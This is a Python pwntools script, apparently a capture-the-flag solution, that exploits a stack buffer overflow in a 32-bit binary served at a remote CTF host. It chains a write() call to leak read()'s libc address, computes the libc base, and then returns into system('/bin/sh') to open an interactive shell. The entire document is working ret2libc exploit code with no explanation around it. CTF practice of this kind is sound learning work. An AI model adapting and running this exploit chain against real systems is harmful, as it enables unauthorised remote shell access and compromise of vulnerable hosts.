import struct
from pwn import *

# p = process('./pwn')
p = remote('hack.bckdr.in', 13371)
libc = ELF('./libc.so.6')    #loading libc

write_call = 0x8048320
noob_function = 0x804843b
read_plt = 0x804a00c
main = 0x8048459
write_plt = 0x804a014
read_call = 0x8048300

exploit = ""
exploit += "AAAABBBBCCCCD"
exploit += p32(write_call) #redirecting to write()
exploit += p32(main)	   #return to after completing call to write()
exploit += p32(0x1)	       #arg[0]
exploit += p32(read_plt)   #arg[1]
exploit += p32(0x4)		   #arg[2] 
# print exploit

p.sendline(exploit + '\n') 
d = p.recv(1024)[-4:] 	   #receiving address of read()

#converting address to hex
read_addr = struct.unpack("I", d)
print "read() is at ", hex(read_addr[0])

#reading offsets from libc.so.6
libc_bin_sh = 0x15902b
libc_read = libc.symbols['read']
libc_system = libc.symbols['system']
libc_exit = libc.symbols['exit']

#calculating base address of libc
libc_base = read_addr[0] - libc_read

#calculating required libc function addresses
system_addr = libc_base + libc_system
bin_sh = libc_base + libc_bin_sh
exit_addr = libc_base + libc_exit

print "libc base is at", hex(libc_base)
print "system() is at", hex(system_addr)
print "bin_sh is at", hex(bin_sh)

#final exploit to spawn a shell
exploit = ""
exploit += "AAAABBBBCCCCD"
exploit += p32(system_addr)
exploit += p32(exit_addr)
exploit += p32(bin_sh)
# print exploit

p.sendline(exploit + '\n')
p.interactive()